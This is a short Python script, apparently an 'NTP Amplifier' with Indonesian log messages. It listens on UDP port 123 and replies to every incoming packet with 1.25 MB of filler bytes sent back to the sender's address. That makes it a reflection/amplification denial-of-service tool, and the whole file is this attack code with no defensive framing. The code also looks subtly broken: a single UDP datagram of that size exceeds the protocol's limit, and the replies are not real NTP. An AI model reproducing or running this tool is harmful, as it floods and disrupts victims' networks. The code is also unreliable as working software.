# p.py
import asyncio

RESPONSE_SIZE = 1250000
NTP_PORT = 123

class NTPAmplifier(asyncio.DatagramProtocol):
    def connection_made(self, transport):
        self.transport = transport
        print(f"[+] Amplifier ON: UDP {NTP_PORT}")

    def datagram_received(self, data, addr):
        print(f"[R] from {addr} -> kirim balik {RESPONSE_SIZE} byte")
        response = b'\x24' * RESPONSE_SIZE
        self.transport.sendto(response, addr)

async def main():
    loop = asyncio.get_running_loop()
    transport, _ = await loop.create_datagram_endpoint(
        lambda: NTPAmplifier(),
        local_addr=('0.0.0.0', NTP_PORT)
    )
    print("[*] NTP Amplifier siap menerima...")
    try:
        await asyncio.sleep(3600)
    finally:
        transport.close()

if __name__ == '__main__':
    asyncio.run(main())
